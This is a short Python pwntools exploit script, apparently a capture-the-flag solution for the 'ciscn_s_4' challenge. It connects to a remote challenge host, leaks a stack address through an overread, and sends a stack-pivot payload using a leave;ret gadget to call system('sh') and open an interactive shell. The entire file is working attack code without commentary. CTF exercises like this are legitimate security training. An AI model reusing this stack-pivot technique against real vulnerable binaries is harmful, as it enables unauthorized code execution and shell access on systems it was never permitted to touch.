from pwn import *


# p = process("./ciscn_s_4")
p = remote("node4.buuoj.cn", 27844)
pro = ELF("./ciscn_s_4")


system = pro.plt["system"]
leave_ret = 0x080485FD


# leak ebp
p.recv()
pad = cyclic(0x28)
p.send(pad)
p.recv(0x7+0x28)
ebp = u32(p.recv(4))
print("ebp: ", hex(ebp))

# attack
vuln_ebp = ebp-0x10
vuln_s = vuln_ebp-0x28 

pad = cyclic(0x4)+p32(system)+b"sh\x00\x00"+p32(vuln_s+0x8)
pad = pad.ljust(0x28, b"\x00")
pad += p32(vuln_s)+p32(leave_ret)
p.send(pad)

p.interactive()


